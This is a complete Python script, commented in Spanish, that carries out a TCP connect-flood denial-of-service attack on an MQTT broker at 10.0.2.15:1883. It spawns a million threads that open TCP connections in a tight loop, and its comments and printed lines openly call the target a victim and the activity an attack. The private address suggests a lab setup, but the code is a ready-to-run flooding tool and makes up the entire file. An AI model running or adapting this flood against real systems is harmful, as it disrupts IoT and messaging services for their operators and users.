import socket
import threading
import time
import random

# Configuración
target_ip = "10.0.2.15"  # IP del broker o víctima
target_port = 1883        # Puerto destino (MQTT por defecto)
connections = []

# Función para abrir conexiones TCP completas
def tcp_connect_flood():
    while True:
        try:
            # Crear socket TCP
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2)  # Timeout bajo para no colgarse

            # Conectar al broker (3-way handshake completo)
            s.connect((target_ip, target_port))
            # connections.append(s)

            print(f"[+] Connected to {target_ip}:{target_port} (Total: {len(connections)})")

        except Exception as e:
            print(f"[!] Connection failed: {e}")

        time.sleep(0.01)  # Controla la velocidad del ataque

# Lanzar múltiples hilos para acelerar el ataque
def start_attack(threads):
    for _ in range(threads):
        t = threading.Thread(target=tcp_connect_flood)
        t.daemon = True
        t.start()

    while True:
        time.sleep(1)

if __name__ == "__main__":
    print(f"[+] Starting TCP Connect Flood to {target_ip}:{target_port}")
    start_attack(threads=1000000)

